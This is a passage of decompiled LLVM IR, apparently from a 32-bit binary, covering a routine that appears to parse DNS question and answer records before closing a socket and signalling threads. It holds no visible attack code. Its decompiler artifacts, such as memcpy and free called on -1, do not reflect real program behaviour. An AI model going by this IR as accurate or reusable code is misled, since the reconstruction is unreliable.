dec_label_pc_8052c4d:                             ; preds = %dec_label_pc_8052c34, %dec_label_pc_8052c4d
  %v0_8052c6468 = phi i32 [ %v1_8052c59, %dec_label_pc_8052c4d ], [ %v1_8052b9c, %dec_label_pc_8052c34 ]
  %v0_8052c4d67 = phi i32 [ %v0_8052c51, %dec_label_pc_8052c4d ], [ %v3_8052bb6, %dec_label_pc_8052c34 ]
  %v2_8052c4d = add i32 %v0_8052c6468, -4
  %v3_8052c4d = inttoptr i32 %v2_8052c4d to i32*
  store i32 %v0_8052c4d67, i32* %v3_8052c4d, align 4
  %v0_8052c4e = load i32, i32* @eax, align 4
  %v2_8052c4e = add i32 %v0_8052c6468, -8
  %v3_8052c4e = inttoptr i32 %v2_8052c4e to i32*
  store i32 %v0_8052c4e, i32* %v3_8052c4e, align 4
  %v0_8052c4f = load i32, i32* @esi, align 4
  %v2_8052c4f = add i32 %v0_8052c6468, -12
  %v3_8052c4f = inttoptr i32 %v2_8052c4f to i32*
  store i32 %v0_8052c4f, i32* %v3_8052c4f, align 4
  %v2_8052c50 = add i32 %v0_8052c6468, -16
  %v3_8052c50 = inttoptr i32 %v2_8052c50 to i32*
  store i32 %v2_8052832, i32* %v3_8052c50, align 4
  %v0_8052c51 = call i32 @__length_question()
  store i32 %v0_8052c51, i32* @eax, align 4
  %v0_8052c56 = load i32, i32* @ebx, align 4
  %v1_8052c56 = add i32 %v0_8052c56, 1
  store i32 %v1_8052c56, i32* @ebx, align 4
  %v0_8052c57 = load i32, i32* @esi, align 4
  %v2_8052c57 = add i32 %v0_8052c57, %v0_8052c51
  store i32 %v2_8052c57, i32* @esi, align 4
  %v0_8052c59 = load i32, i32* @esp, align 4
  %v1_8052c59 = add i32 %v0_8052c59, 16
  %v2_8052c5c = add i32 %v0_8052c59, 116
  %v3_8052c5c = inttoptr i32 %v2_8052c5c to i32*
  %v4_8052c5c = load i32, i32* %v3_8052c5c, align 4
  %v5_8052c5c = sub i32 %v1_8052c56, %v4_8052c5c
  %v11_8052c5c = xor i32 %v4_8052c5c, %v1_8052c56
  %v12_8052c5c = xor i32 %v5_8052c5c, %v1_8052c56
  %v13_8052c5c = and i32 %v12_8052c5c, %v11_8052c5c
  %v14_8052c5c = icmp slt i32 %v13_8052c5c, 0
  %v16_8052c5c = icmp slt i32 %v5_8052c5c, 0
  %v2_8052c60 = icmp eq i1 %v16_8052c5c, %v14_8052c5c
  br i1 %v2_8052c60, label %dec_label_pc_8052c62, label %dec_label_pc_8052c4d

dec_label_pc_8052c62:                             ; preds = %dec_label_pc_8052c4d, %dec_label_pc_8052c34
  %v0_8052c64.lcssa = phi i32 [ %v1_8052b9c, %dec_label_pc_8052c34 ], [ %v1_8052c59, %dec_label_pc_8052c4d ]
  store i32 0, i32* @ebx, align 4
  %v1_8052c64 = add i32 %v0_8052c64.lcssa, 27
  %v2_8052c64 = inttoptr i32 %v1_8052c64 to i8*
  store i8 1, i8* %v2_8052c64, align 1
  %v0_8052d92.pre = load i32, i32* @ebx, align 4
  %v1_8052d92.pre = load i32, i32* @esp, align 4
  %v2_8052d9269 = add i32 %v1_8052d92.pre, 104
  %v3_8052d9270 = inttoptr i32 %v2_8052d9269 to i32*
  %v4_8052d9271 = load i32, i32* %v3_8052d9270, align 4
  %v5_8052d9272 = sub i32 %v0_8052d92.pre, %v4_8052d9271
  %v11_8052d9274 = xor i32 %v4_8052d9271, %v0_8052d92.pre
  %v12_8052d9275 = xor i32 %v5_8052d9272, %v0_8052d92.pre
  %v13_8052d9276 = and i32 %v12_8052d9275, %v11_8052d9274
  %v14_8052d9277 = icmp slt i32 %v13_8052d9276, 0
  %v16_8052d9279 = icmp slt i32 %v5_8052d9272, 0
  %v2_8052d9680 = icmp eq i1 %v16_8052d9279, %v14_8052d9277
  br i1 %v2_8052d9680, label %dec_label_pc_8052da2, label %dec_label_pc_8052d98.lr.ph

dec_label_pc_8052d98.lr.ph:                       ; preds = %dec_label_pc_8052c62
  %v0_8052d98.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052d98

dec_label_pc_8052c6e:                             ; preds = %dec_label_pc_8052d98
  %v1_8052c6e = add i32 %v0_8052c6e81, 116
  store i32 %v1_8052c6e, i32* %eax.global-to-local, align 4
  %v2_8052c72 = add i32 %v0_8052c6e81, -4
  %v3_8052c72 = inttoptr i32 %v2_8052c72 to i32*
  store i32 %v1_8052c6e, i32* %v3_8052c72, align 4
  %v3_8052c73 = load i32, i32* %v3_8052d98, align 4
  %v5_8052c73 = add i32 %v0_8052c6e81, -8
  %v6_8052c73 = inttoptr i32 %v5_8052c73 to i32*
  store i32 %v3_8052c73, i32* %v6_8052c73, align 4
  %v0_8052c77 = load i32, i32* @esi, align 4
  %v2_8052c77 = add i32 %v0_8052c6e81, -12
  %v3_8052c77 = inttoptr i32 %v2_8052c77 to i32*
  store i32 %v0_8052c77, i32* %v3_8052c77, align 4
  %v2_8052c78 = add i32 %v0_8052c6e81, -16
  %v3_8052c78 = inttoptr i32 %v2_8052c78 to i32*
  store i32 %v2_8052832, i32* %v3_8052c78, align 4
  %v0_8052c79 = call i32 @__decode_answer()
  store i32 %v0_8052c79, i32* @eax, align 4
  %v1_8052c7e = load i32, i32* @esp, align 4
  %v2_8052c7e = add i32 %v1_8052c7e, 68
  %v3_8052c7e = inttoptr i32 %v2_8052c7e to i32*
  store i32 %v0_8052c79, i32* %v3_8052c7e, align 4
  %v0_8052c82 = load i32, i32* @esp, align 4
  %v1_8052c82 = add i32 %v0_8052c82, 16
  %v2_8052c85 = icmp slt i32 %v0_8052c79, 0
  %v1_8052c87 = icmp eq i1 %v2_8052c85, false
  br i1 %v1_8052c87, label %dec_label_pc_8052ca1, label %dec_label_pc_8052c89

dec_label_pc_8052c89:                             ; preds = %dec_label_pc_8052c6e
  %v0_8052c89 = load i32, i32* @ebx, align 4
  %v1_8052c89 = icmp eq i32 %v0_8052c89, 0
  br i1 %v1_8052c89, label %dec_label_pc_8052e34, label %dec_label_pc_8052c91

dec_label_pc_8052c91:                             ; preds = %dec_label_pc_8052c89
  %v1_8052c91 = add i32 %v0_8052c82, 100
  %v2_8052c91 = inttoptr i32 %v1_8052c91 to i32*
  %v3_8052c91 = load i32, i32* %v2_8052c91, align 4
  %v4_8052c91 = icmp eq i32 %v3_8052c91, 0
  br i1 %v4_8052c91, label %dec_label_pc_8052e34, label %dec_label_pc_8052da2

dec_label_pc_8052ca1:                             ; preds = %dec_label_pc_8052c6e
  %v1_8052ca1 = add i32 %v0_8052c82, 43
  %v2_8052ca1 = inttoptr i32 %v1_8052ca1 to i8*
  %v3_8052ca1 = load i8, i8* %v2_8052ca1, align 1
  %v4_8052ca1 = icmp eq i8 %v3_8052ca1, 0
  br i1 %v4_8052ca1, label %dec_label_pc_8052d42, label %dec_label_pc_8052cac

dec_label_pc_8052cac:                             ; preds = %dec_label_pc_8052ca1
  %v0_8052cac = load i32, i32* @edi, align 4
  %v1_8052cac = add i32 %v0_8052cac, 28
  %v2_8052cac = inttoptr i32 %v1_8052cac to i32*
  %v3_8052cac = load i32, i32* %v2_8052cac, align 4
  store i32 %v3_8052cac, i32* %eax.global-to-local, align 4
  %v2_8052caf = add i32 %v0_8052c82, 160
  %v3_8052caf = inttoptr i32 %v2_8052caf to i32*
  store i32 %v3_8052cac, i32* %v3_8052caf, align 4
  %v0_8052cb6 = load i32, i32* @edi, align 4
  %v1_8052cb6 = add i32 %v0_8052cb6, 32
  %v2_8052cb6 = inttoptr i32 %v1_8052cb6 to i32*
  %v3_8052cb6 = load i32, i32* %v2_8052cb6, align 4
  store i32 %v3_8052cb6, i32* %eax.global-to-local, align 4
  %v1_8052cb9 = load i32, i32* @esp, align 4
  %v2_8052cb9 = add i32 %v1_8052cb9, 148
  %v3_8052cb9 = inttoptr i32 %v2_8052cb9 to i32*
  store i32 %v3_8052cb6, i32* %v3_8052cb9, align 4
  %v0_8052cc0 = load i32, i32* @edi, align 4
  %v1_8052cc0 = add i32 %v0_8052cc0, 36
  %v2_8052cc0 = inttoptr i32 %v1_8052cc0 to i32*
  %v3_8052cc0 = load i32, i32* %v2_8052cc0, align 4
  store i32 %v3_8052cc0, i32* %eax.global-to-local, align 4
  %v1_8052cc3 = load i32, i32* @esp, align 4
  %v2_8052cc3 = add i32 %v1_8052cc3, 152
  %v3_8052cc3 = inttoptr i32 %v2_8052cc3 to i32*
  store i32 %v3_8052cc0, i32* %v3_8052cc3, align 4
  %v0_8052cca = load i32, i32* @ecx, align 4
  %v1_8052cca = load i32, i32* @esp, align 4
  %v2_8052cca = add i32 %v1_8052cca, -4
  %v3_8052cca = inttoptr i32 %v2_8052cca to i32*
  store i32 %v0_8052cca, i32* %v3_8052cca, align 4
  %v1_8052ccb = add i32 %v1_8052cca, -8
  %v2_8052ccb = inttoptr i32 %v1_8052ccb to i32*
  store i32 40, i32* %v2_8052ccb, align 4
  %v1_8052ccd = add i32 %v1_8052cca, 116
  store i32 %v1_8052ccd, i32* %edx.global-to-local, align 4
  %v2_8052cd1 = add i32 %v1_8052cca, -12
  %v3_8052cd1 = inttoptr i32 %v2_8052cd1 to i32*
  store i32 %v1_8052ccd, i32* %v3_8052cd1, align 4
  %v0_8052cd2 = load i32, i32* @edi, align 4
  %v2_8052cd2 = add i32 %v1_8052cca, -16
  %v3_8052cd2 = inttoptr i32 %v2_8052cd2 to i32*
  store i32 %v0_8052cd2, i32* %v3_8052cd2, align 4
  %v5_8052cd3 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80528c0, i32 %v3_805291f)
  store i32 %v5_8052cd3, i32* %eax.global-to-local, align 4
  %v0_8052cd8 = load i32, i32* @edi, align 4
  %v1_8052cd8 = add i32 %v0_8052cd8, 4
  %v2_8052cd8 = inttoptr i32 %v1_8052cd8 to i32*
  %v3_8052cd8 = load i32, i32* %v2_8052cd8, align 4
  store i32 %v3_8052cd8, i32* %eax.global-to-local, align 4
  %v0_8052cdb = load i32, i32* @esp, align 4
  %v1_8052cdb = add i32 %v0_8052cdb, 16
  %v9_8052cde = icmp eq i32 %v3_8052cd8, 24
  br i1 %v9_8052cde, label %dec_label_pc_8052cac.dec_label_pc_8052d05_crit_edge, label %dec_label_pc_8052ce3

dec_label_pc_8052cac.dec_label_pc_8052d05_crit_edge: ; preds = %dec_label_pc_8052cac
  %.pre24 = add i32 %v0_8052cdb, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8052d05.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8052d05

dec_label_pc_8052ce3:                             ; preds = %dec_label_pc_8052cac
  %v1_8052ce3 = add i32 %v0_8052cd8, 28
  %v2_8052ce3 = inttoptr i32 %v1_8052ce3 to i32*
  %v3_8052ce3 = load i32, i32* %v2_8052ce3, align 4
  %v4_8052ce3 = icmp eq i32 %v3_8052ce3, 0
  br i1 %v4_8052ce3, label %dec_label_pc_8052da2, label %dec_label_pc_8052ced

dec_label_pc_8052ced:                             ; preds = %dec_label_pc_8052ce3
  %v1_8052ced = add i32 %v0_8052cdb, 260
  %v2_8052ced = inttoptr i32 %v1_8052ced to i32*
  %v3_8052ced = load i32, i32* %v2_8052ced, align 4
  %v12_8052ced = icmp eq i32 %v3_8052ced, 1
  br i1 %v12_8052ced, label %dec_label_pc_8052d05, label %dec_label_pc_8052cf7

dec_label_pc_8052cf7:                             ; preds = %dec_label_pc_8052ced
  %v12_8052cf7 = icmp eq i32 %v3_8052ced, 28
  %v1_8052cff = icmp eq i1 %v12_8052cf7, false
  br i1 %v1_8052cff, label %dec_label_pc_8052da2, label %dec_label_pc_8052d05

dec_label_pc_8052d05:                             ; preds = %dec_label_pc_8052cac.dec_label_pc_8052d05_crit_edge, %dec_label_pc_8052cf7, %dec_label_pc_8052ced
  %v4_8052d05 = phi i32 [ %v4_8052d05.pre, %dec_label_pc_8052cac.dec_label_pc_8052d05_crit_edge ], [ %v3_8052ced, %dec_label_pc_8052cf7 ], [ 1, %dec_label_pc_8052ced ]
  %v15_8052d05 = icmp eq i32 %v3_8052cd8, %v4_8052d05
  br i1 %v15_8052d05, label %dec_label_pc_8052d1a, label %dec_label_pc_8052d0e

dec_label_pc_8052d0e:                             ; preds = %dec_label_pc_8052d05
  %v1_8052d11 = inttoptr i32 %v0_8052cd8 to i32*
  %v2_8052d11 = load i32, i32* %v1_8052d11, align 4
  %v5_8052d11 = inttoptr i32 %v0_8052cdb to i32*
  store i32 %v2_8052d11, i32* %v5_8052d11, align 4
  %v1_8052d13 = call i32 @free(i32 -1)
  store i32 %v1_8052d13, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d8a

dec_label_pc_8052d1a:                             ; preds = %dec_label_pc_8052d05
  %v0_8052d1a = load i32, i32* @ebx, align 4
  %v1_8052d1c = sub i32 -1, %v0_8052d1a
  store i32 %v1_8052d1c, i32* %eax.global-to-local, align 4
  %v2_8052d1e = add i32 %v0_8052cdb, 120
  %v3_8052d1e = inttoptr i32 %v2_8052d1e to i32*
  %v4_8052d1e = load i32, i32* %v3_8052d1e, align 4
  %v5_8052d1e = add i32 %v4_8052d1e, %v1_8052d1c
  store i32 %v5_8052d1e, i32* %eax.global-to-local, align 4
  %v2_8052d22 = add i32 %v0_8052cd8, 36
  %v3_8052d22 = inttoptr i32 %v2_8052d22 to i32*
  store i32 %v5_8052d1e, i32* %v3_8052d22, align 4
  %v0_8052d25 = load i32, i32* @edi, align 4
  %v1_8052d25 = add i32 %v0_8052d25, 16
  %v2_8052d25 = inttoptr i32 %v1_8052d25 to i32*
  %v3_8052d25 = load i32, i32* %v2_8052d25, align 4
  %v1_8052d28 = add i32 %v3_8052d25, 4
  store i32 %v1_8052d28, i32* %eax.global-to-local, align 4
  %v2_8052d2b = add i32 %v0_8052d25, 36
  %v3_8052d2b = inttoptr i32 %v2_8052d2b to i32*
  %v4_8052d2b = load i32, i32* %v3_8052d2b, align 4
  %v7_8052d2b = mul i32 %v4_8052d2b, %v1_8052d28
  store i32 %v7_8052d2b, i32* %eax.global-to-local, align 4
  %v2_8052d2f = add i32 %v0_8052d25, 32
  %v3_8052d2f = inttoptr i32 %v2_8052d2f to i32*
  %v4_8052d2f = load i32, i32* %v3_8052d2f, align 4
  %v6_8052d32 = icmp ugt i32 %v7_8052d2b, %v4_8052d2f
  br i1 %v6_8052d32, label %dec_label_pc_8052d1a.dec_label_pc_8052da2.loopexit_crit_edge, label %dec_label_pc_8052d34

dec_label_pc_8052d1a.dec_label_pc_8052da2.loopexit_crit_edge: ; preds = %dec_label_pc_8052d1a
  %v0_8052da2.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052da2

dec_label_pc_8052d34:                             ; preds = %dec_label_pc_8052d1a
  store i32 0, i32* %v3_8052d2b, align 4
  %v0_8052d3b = load i32, i32* @esp, align 4
  %v1_8052d3b = add i32 %v0_8052d3b, 27
  %v2_8052d3b = inttoptr i32 %v1_8052d3b to i8*
  store i8 0, i8* %v2_8052d3b, align 1
  %v1_8052d8d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052d8d

dec_label_pc_8052d42:                             ; preds = %dec_label_pc_8052ca1
  %v1_8052d45 = add i32 %v0_8052c82, 132
  %v2_8052d45 = inttoptr i32 %v1_8052d45 to i32*
  %v3_8052d45 = load i32, i32* %v2_8052d45, align 4
  %v6_8052d45 = inttoptr i32 %v0_8052c82 to i32*
  store i32 %v3_8052d45, i32* %v6_8052d45, align 4
  %v1_8052d4c = call i32 @free(i32 -1)
  store i32 %v1_8052d4c, i32* %eax.global-to-local, align 4
  %v0_8052d51 = load i32, i32* @esp, align 4
  %v1_8052d51 = add i32 %v0_8052d51, 16
  %v1_8052d54 = add i32 %v0_8052d51, 260
  %v2_8052d54 = inttoptr i32 %v1_8052d54 to i32*
  %v3_8052d54 = load i32, i32* %v2_8052d54, align 4
  store i32 %v3_8052d54, i32* %eax.global-to-local, align 4
  %v1_8052d5b = add i32 %v0_8052d51, 136
  %v2_8052d5b = inttoptr i32 %v1_8052d5b to i32*
  %v3_8052d5b = load i32, i32* %v2_8052d5b, align 4
  %v15_8052d5b = icmp eq i32 %v3_8052d5b, %v3_8052d54
  %v1_8052d5f = icmp eq i1 %v15_8052d5b, false
  br i1 %v1_8052d5f, label %dec_label_pc_8052d8d, label %dec_label_pc_8052d61

dec_label_pc_8052d61:                             ; preds = %dec_label_pc_8052d42
  %v0_8052d61 = load i32, i32* @edi, align 4
  %v1_8052d61 = add i32 %v0_8052d61, 16
  %v2_8052d61 = inttoptr i32 %v1_8052d61 to i32*
  %v3_8052d61 = load i32, i32* %v2_8052d61, align 4
  store i32 %v3_8052d61, i32* %eax.global-to-local, align 4
  %v2_8052d64 = add i32 %v0_8052d51, 148
  %v3_8052d64 = inttoptr i32 %v2_8052d64 to i32*
  %v4_8052d64 = load i32, i32* %v3_8052d64, align 4
  %v15_8052d64 = icmp eq i32 %v3_8052d61, %v4_8052d64
  %v1_8052d6b = icmp eq i1 %v15_8052d64, false
  br i1 %v1_8052d6b, label %dec_label_pc_8052e27, label %dec_label_pc_8052d71

dec_label_pc_8052d71:                             ; preds = %dec_label_pc_8052d61
  %v0_8052d71 = load i32, i32* @edx, align 4
  %v2_8052d71 = add i32 %v0_8052d51, 12
  %v3_8052d71 = inttoptr i32 %v2_8052d71 to i32*
  store i32 %v0_8052d71, i32* %v3_8052d71, align 4
  %v0_8052d72 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052d72 = add i32 %v0_8052d51, 8
  %v3_8052d72 = inttoptr i32 %v2_8052d72 to i32*
  store i32 %v0_8052d72, i32* %v3_8052d72, align 4
  %v1_8052d73 = add i32 %v0_8052d51, 152
  %v2_8052d73 = inttoptr i32 %v1_8052d73 to i32*
  %v3_8052d73 = load i32, i32* %v2_8052d73, align 4
  %v5_8052d73 = add i32 %v0_8052d51, 4
  %v6_8052d73 = inttoptr i32 %v5_8052d73 to i32*
  store i32 %v3_8052d73, i32* %v6_8052d73, align 4
  %v0_8052d7a = load i32, i32* %eax.global-to-local, align 4
  %v1_8052d7a = load i32, i32* @edi, align 4
  %v2_8052d7a = add i32 %v1_8052d7a, 36
  %v3_8052d7a = inttoptr i32 %v2_8052d7a to i32*
  %v4_8052d7a = load i32, i32* %v3_8052d7a, align 4
  %v7_8052d7a = mul i32 %v4_8052d7a, %v0_8052d7a
  store i32 %v7_8052d7a, i32* %eax.global-to-local, align 4
  %v2_8052d7e = add i32 %v1_8052d7a, 28
  %v3_8052d7e = inttoptr i32 %v2_8052d7e to i32*
  %v4_8052d7e = load i32, i32* %v3_8052d7e, align 4
  %v5_8052d7e = add i32 %v4_8052d7e, %v7_8052d7a
  store i32 %v5_8052d7e, i32* %eax.global-to-local, align 4
  %v3_8052d81 = inttoptr i32 %v0_8052d51 to i32*
  store i32 %v5_8052d7e, i32* %v3_8052d81, align 4
  %v5_8052d82 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_80528c0, i32 %v3_805291f)
  store i32 %v5_8052d82, i32* %eax.global-to-local, align 4
  %v0_8052d87 = load i32, i32* @edi, align 4
  %v1_8052d87 = add i32 %v0_8052d87, 36
  %v2_8052d87 = inttoptr i32 %v1_8052d87 to i32*
  %v3_8052d87 = load i32, i32* %v2_8052d87, align 4
  %v4_8052d87 = add i32 %v3_8052d87, 1
  store i32 %v4_8052d87, i32* %v2_8052d87, align 4
  br label %dec_label_pc_8052d8a

dec_label_pc_8052d8a:                             ; preds = %dec_label_pc_8052d0e, %dec_label_pc_8052d71
  %v0_8052d8a = load i32, i32* @esp, align 4
  %v1_8052d8a = add i32 %v0_8052d8a, 16
  br label %dec_label_pc_8052d8d

dec_label_pc_8052d8d:                             ; preds = %dec_label_pc_8052d42, %dec_label_pc_8052d34, %dec_label_pc_8052d8a
  %v1_8052d8d = phi i32 [ %v1_8052d51, %dec_label_pc_8052d42 ], [ %v1_8052d8d.pre, %dec_label_pc_8052d34 ], [ %v1_8052d8a, %dec_label_pc_8052d8a ]
  %v0_8052d8d = load i32, i32* @esi, align 4
  %v2_8052d8d = add i32 %v1_8052d8d, 52
  %v3_8052d8d = inttoptr i32 %v2_8052d8d to i32*
  %v4_8052d8d = load i32, i32* %v3_8052d8d, align 4
  %v5_8052d8d = add i32 %v4_8052d8d, %v0_8052d8d
  store i32 %v5_8052d8d, i32* @esi, align 4
  %v0_8052d91 = load i32, i32* @ebx, align 4
  %v1_8052d91 = add i32 %v0_8052d91, 1
  store i32 %v1_8052d91, i32* @ebx, align 4
  %v2_8052d92 = add i32 %v1_8052d8d, 104
  %v3_8052d92 = inttoptr i32 %v2_8052d92 to i32*
  %v4_8052d92 = load i32, i32* %v3_8052d92, align 4
  %v5_8052d92 = sub i32 %v1_8052d91, %v4_8052d92
  %v11_8052d92 = xor i32 %v4_8052d92, %v1_8052d91
  %v12_8052d92 = xor i32 %v5_8052d92, %v1_8052d91
  %v13_8052d92 = and i32 %v12_8052d92, %v11_8052d92
  %v14_8052d92 = icmp slt i32 %v13_8052d92, 0
  %v16_8052d92 = icmp slt i32 %v5_8052d92, 0
  %v2_8052d96 = icmp eq i1 %v16_8052d92, %v14_8052d92
  br i1 %v2_8052d96, label %dec_label_pc_8052da2, label %dec_label_pc_8052d98

dec_label_pc_8052d98:                             ; preds = %dec_label_pc_8052d98.lr.ph, %dec_label_pc_8052d8d
  %v0_8052d98 = phi i32 [ %v0_8052d98.pre, %dec_label_pc_8052d98.lr.ph ], [ %v5_8052d8d, %dec_label_pc_8052d8d ]
  %v0_8052c6e81 = phi i32 [ %v1_8052d92.pre, %dec_label_pc_8052d98.lr.ph ], [ %v1_8052d8d, %dec_label_pc_8052d8d ]
  %v2_8052d98 = add i32 %v0_8052c6e81, 16
  %v3_8052d98 = inttoptr i32 %v2_8052d98 to i32*
  %v4_8052d98 = load i32, i32* %v3_8052d98, align 4
  %v5_8052d98 = sub i32 %v0_8052d98, %v4_8052d98
  %v11_8052d98 = xor i32 %v4_8052d98, %v0_8052d98
  %v12_8052d98 = xor i32 %v5_8052d98, %v0_8052d98
  %v13_8052d98 = and i32 %v12_8052d98, %v11_8052d98
  %v14_8052d98 = icmp slt i32 %v13_8052d98, 0
  %v16_8052d98 = icmp slt i32 %v5_8052d98, 0
  %v2_8052d9c = icmp eq i1 %v16_8052d98, %v14_8052d98
  br i1 %v2_8052d9c, label %dec_label_pc_8052da2, label %dec_label_pc_8052c6e

dec_label_pc_8052da2:                             ; preds = %dec_label_pc_8052c91, %dec_label_pc_8052c62, %dec_label_pc_8052d8d, %dec_label_pc_8052ce3, %dec_label_pc_8052cf7, %dec_label_pc_8052d98, %dec_label_pc_8052d1a.dec_label_pc_8052da2.loopexit_crit_edge
  %v0_8052da2 = phi i32 [ %v0_8052da2.pre.pre, %dec_label_pc_8052d1a.dec_label_pc_8052da2.loopexit_crit_edge ], [ %v1_8052d92.pre, %dec_label_pc_8052c62 ], [ %v1_8052d8d, %dec_label_pc_8052d8d ], [ %v1_8052cdb, %dec_label_pc_8052ce3 ], [ %v1_8052cdb, %dec_label_pc_8052cf7 ], [ %v0_8052c6e81, %dec_label_pc_8052d98 ], [ %v1_8052c82, %dec_label_pc_8052c91 ]
  %v1_8052da5 = add i32 %v0_8052da2, 20
  %v2_8052da5 = inttoptr i32 %v1_8052da5 to i32*
  %v3_8052da5 = load i32, i32* %v2_8052da5, align 4
  %v5_8052da5 = add i32 %v0_8052da2, -16
  %v6_8052da5 = inttoptr i32 %v5_8052da5 to i32*
  store i32 %v3_8052da5, i32* %v6_8052da5, align 4
  %v1_8052da9 = call i32 @__libc_close(i32 -1)
  store i32 %v1_8052da9, i32* %eax.global-to-local, align 4
  %v0_8052dae = load i32, i32* @esp, align 4
  %v1_8052db1 = add i32 %v0_8052dae, 272
  %v2_8052db1 = inttoptr i32 %v1_8052db1 to i32*
  %v3_8052db1 = load i32, i32* %v2_8052db1, align 4
  %v4_8052db1 = icmp eq i32 %v3_8052db1, 0
  br i1 %v4_8052db1, label %dec_label_pc_8052dc6, label %dec_label_pc_8052dbb

dec_label_pc_8052dbb:                             ; preds = %dec_label_pc_8052da2
  store i32 %v3_8052db1, i32* %edx.global-to-local, align 4
  %v2_8052dc2 = inttoptr i32 %v3_8052db1 to i32*
  store i32 %v2_8052832, i32* %v2_8052dc2, align 4
  %v0_8052dd2.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052dd2

dec_label_pc_8052dc6:                             ; preds = %dec_label_pc_8052da2
  %v3_8052dc9 = inttoptr i32 %v0_8052dae to i32*
  store i32 %v2_8052832, i32* %v3_8052dc9, align 4
  %v1_8052dca = call i32 @free(i32 -1)
  store i32 %v1_8052dca, i32* %eax.global-to-local, align 4
  %v0_8052dcf = load i32, i32* @esp, align 4
  %v1_8052dcf = add i32 %v0_8052dcf, 16
  br label %dec_label_pc_8052dd2

dec_label_pc_8052dd2:                             ; preds = %dec_label_pc_8052dbb, %dec_label_pc_8052dc6
  %v0_8052dd2 = phi i32 [ %v0_8052dd2.pre, %dec_label_pc_8052dbb ], [ %v1_8052dcf, %dec_label_pc_8052dc6 ]
  %v1_8052dd5 = add i32 %v0_8052dd2, 12
  %v2_8052dd5 = inttoptr i32 %v1_8052dd5 to i32*
  %v3_8052dd5 = load i32, i32* %v2_8052dd5, align 4
  %v5_8052dd5 = add i32 %v0_8052dd2, -16
  %v6_8052dd5 = inttoptr i32 %v5_8052dd5 to i32*
  store i32 %v3_8052dd5, i32* %v6_8052dd5, align 4
  %v1_8052dd9 = call i32 @free(i32 -1)
  store i32 %v1_8052dd9, i32* @eax, align 4
  %v0_8052dde = load i32, i32* @esp, align 4
  %v1_8052de1 = add i32 %v0_8052dde, 8
  %v2_8052de1 = inttoptr i32 %v1_8052de1 to i32*
  store i32 ptrtoint (i8** @global_var_805e728.268 to i32), i32* %v2_8052de1, align 4
  %v1_8052de6 = add i32 %v0_8052dde, 4
  %v2_8052de6 = inttoptr i32 %v1_8052de6 to i32*
  store i32 134550743, i32* %v2_8052de6, align 4
  %v1_8052deb = add i32 %v0_8052dde, 200
  store i32 %v1_8052deb, i32* %ebx.global-to-local, align 4
  %v3_8052df2 = inttoptr i32 %v0_8052dde to i32*
  store i32 %v1_8052deb, i32* %v3_8052df2, align 4
  %v2_8052df3 = call i32 @__pthread_return_void(i32 -1, i32 %v15_80528c0)
  store i32 %v2_8052df3, i32* %eax.global-to-local, align 4
  %v0_8052df8 = load i32, i32* @esp, align 4
  %v1_8052df8 = inttoptr i32 %v0_8052df8 to i32*
  store i32 ptrtoint (i8** @global_var_805e728.268 to i32), i32* %v1_8052df8, align 4
  %v1_8052dff = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052dff, i32* %eax.global-to-local, align 4
  %v0_8052e04 = load i32, i32* @esp, align 4
  %v1_8052e04 = add i32 %v0_8052e04, 56
  %v2_8052e04 = inttoptr i32 %v1_8052e04 to i32*
  %v3_8052e04 = load i32, i32* %v2_8052e04, align 4
  store i32 %v3_8052e04, i32* @eax, align 4
  %v1_8052e08 = add i32 %v0_8052e04, 72
  %v2_8052e08 = inttoptr i32 %v1_8052e08 to i32*
  %v3_8052e08 = load i32, i32* %v2_8052e08, align 4
  store i32 %v3_8052e08, i32* %edx.global-to-local, align 4
  %v1_8052e0c = inttoptr i32 %v0_8052e04 to i32*
  %v3_8052e0c = add i32 %v0_8052e04, 4
  %v1_8052e0d = inttoptr i32 %v3_8052e0c to i32*
  store i32 1, i32* %v1_8052e0d, align 4
  %v0_8052e10 = load i32, i32* @eax, align 4
  %v1_8052e10 = sext i32 %v0_8052e10 to i64
  store i64 %v1_8052e10, i64* @global_var_805e740.269, align 64
  %v0_8052e15 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052e15 = trunc i32 %v0_8052e15 to i16
  store i16 %v1_8052e15, i16* @global_var_8058484.270, align 4
  %v0_8052e1c = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8052e1c, i32* %v1_8052e0c, align 4
  %v2_8052e1d = call i32 @__pthread_return_void(i32 -1, i32 %v15_80528c0)
  store i32 %v2_8052e1d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f5e

dec_label_pc_8052e27:                             ; preds = %dec_label_pc_8052d61
  %v1_8052e2a = inttoptr i32 %v0_8052d61 to i32*
  %v2_8052e2a = load i32, i32* %v1_8052e2a, align 4
  %v5_8052e2a = inttoptr i32 %v0_8052d51 to i32*
  store i32 %v2_8052e2a, i32* %v5_8052e2a, align 4
  %v1_8052e2c = call i32 @free(i32 -1)
  store i32 %v1_8052e2c, i32* @eax, align 4
  %v0_8052e31 = load i32, i32* @esp, align 4
  %v1_8052e31 = add i32 %v0_8052e31, 16
  br label %dec_label_pc_8052e34

dec_label_pc_8052e34:                             ; preds = %dec_label_pc_8052b66, %dec_label_pc_8052c91, %dec_label_pc_8052c89, %dec_label_pc_8052c25, %dec_label_pc_8052bab, %dec_label_pc_8052b87, %dec_label_pc_8052e27
  %v1_8052e3b = phi i32 [ %v1_8052b7b, %dec_label_pc_8052b66 ], [ %v1_8052c82, %dec_label_pc_8052c91 ], [ %v1_8052c82, %dec_label_pc_8052c89 ], [ %v1_8052b9c, %dec_label_pc_8052c25 ], [ %v1_8052b9c, %dec_label_pc_8052bab ], [ %v1_8052b9c, %dec_label_pc_8052b87 ], [ %v1_8052e31, %dec_label_pc_8052e27 ]
  %v1_8052e34 = add i32 %v1_8052e3b, 51
  %v2_8052e34 = inttoptr i32 %v1_8052e34 to i8*
  %v3_8052e34 = load i8, i8* %v2_8052e34, align 1
  %v4_8052e34 = icmp eq i8 %v3_8052e34, 0
  %v1_8052e39 = icmp eq i1 %v4_8052e34, false
